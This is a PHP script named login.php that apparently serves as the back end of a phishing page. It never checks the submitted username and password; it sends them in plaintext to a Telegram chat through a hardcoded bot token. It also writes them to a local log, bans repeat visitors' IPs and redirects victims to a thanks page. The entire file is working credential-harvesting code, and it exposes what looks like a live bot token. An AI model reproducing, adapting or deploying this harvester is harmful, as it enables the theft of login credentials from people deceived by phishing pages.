<?php
// login.php - cleaned English version

// --- CONFIGURATION ---
$chatId   = "-1002916334661";
$botToken = "8048587597:AAHQWKcAC4m_vDA5uVKVXzjp3MGgq7OSXks"; // replace with your new bot token
$logFile  = __DIR__ . '/login_log.txt'; // log file (ensure write permissions)
$banFile  = __DIR__ . '/banned_ips.txt'; // файл для банів
// ---------------------

// Отримуємо IP
$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';

// --- IP BAN CHECK ---
if (file_exists($banFile)) {
    $bannedIps = file($banFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $bannedIps, true)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Access denied.");
    }
}

// --- COUNT ATTEMPTS ---
$attemptFile = __DIR__ . '/attempts.json';
$attempts = [];
if (file_exists($attemptFile)) {
    $json = file_get_contents($attemptFile);
    $attempts = json_decode($json, true) ?: [];
}
if (!isset($attempts[$ip])) {
    $attempts[$ip] = 0;
}
$attempts[$ip]++;

if ($attempts[$ip] > 2) {
    // Банимо
    file_put_contents($banFile, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    header("HTTP/1.1 403 Forbidden");
    exit("Access denied.");
}

// Зберігаємо оновлені спроби
file_put_contents($attemptFile, json_encode($attempts), LOCK_EX);

// --- ORIGINAL LOGIC (НЕ ЧІПАВ) ---
// Get POST values safely
$username = isset($_POST['_user']) ? trim((string)$_POST['_user']) : '';
$password = isset($_POST['_pass']) ? trim((string)$_POST['_pass']) : '';

// Determine return URL
$rawRef = '';
if (!empty($_POST['referrer'])) {
    $rawRef = (string)$_POST['referrer'];
} elseif (!empty($_SERVER['HTTP_REFERER'])) {
    $rawRef = (string)$_SERVER['HTTP_REFERER'];
}
$returnUrl = $rawRef !== '' ? $rawRef : '';

// Build message
$time = date('Y-m-d H:i:s');
$message = "TARGET: 2\nTime: {$time}\nIP: {$ip}\nUser: {$username}\nPass: {$password}";

// Send to Telegram
$apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = [
    'chat_id' => $chatId,
    'text'    => $message,
];

// cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
$response = curl_exec($ch);
$curlErr = curl_error($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Logging
$logEntry = sprintf(
    "[%s] IP=%s user=%s pass=%s tg_http=%s curl_err=%s%s\n",
    $time,
    $ip,
    str_replace(["\n","\r"], ['',''], $username),
    str_replace(["\n","\r"], ['',''], $password),
    $httpCode,
    str_replace(["\n","\r"], ['',''], $curlErr),
    ($response ? " response=" . substr($response, 0, 200) : '')
);
@file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);

// Prepare redirect
$returnParam = rawurlencode($returnUrl);
// Redirect to thanks.html
header("Location: thanks.html?return={$returnParam}");
exit;
